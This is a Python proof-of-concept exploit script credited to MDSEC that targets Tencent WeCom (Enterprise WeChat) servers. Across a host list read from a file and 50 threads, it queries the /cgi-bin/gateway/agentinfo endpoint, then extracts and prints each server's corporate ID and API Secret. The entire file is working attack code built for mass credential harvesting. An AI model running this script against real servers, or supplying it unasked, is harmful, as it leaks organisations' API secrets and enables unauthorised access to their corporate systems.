#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# product="Tencent-企业微信"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                   +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                           +')
    print(
        '+ EXP: python3 Enterprise_VX_Infoleak_Exp.py url.txt                                                         +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
def poc(host):
    url = host
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Host": "%s" % host  
    }
    vulurl = "https://"+url + "/cgi-bin/gateway/agentinfo"
    try:
        r = requests.get(vulurl, headers=headers)
        if r.status_code==200 and "strcorpid" in r.text and "\"errcode\":0" in r.text:
            strcorpid = r.text.replace('\"',"").replace('{',"").replace('}',"").split('strcorpid:')[1].split(",corpid")[0]
            Secret = r.text.replace('\"',"").replace('{',"").replace('}',"").split('Secret:')[1].split(",}")[0]
            print("http://"+host+":true")
            print("strcotpid= "+ strcorpid)
            print("Secret= "+ Secret)
        else:
            return 0
            print (host+":false")
    except:
        print (host+":false")

if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(poc, row[0])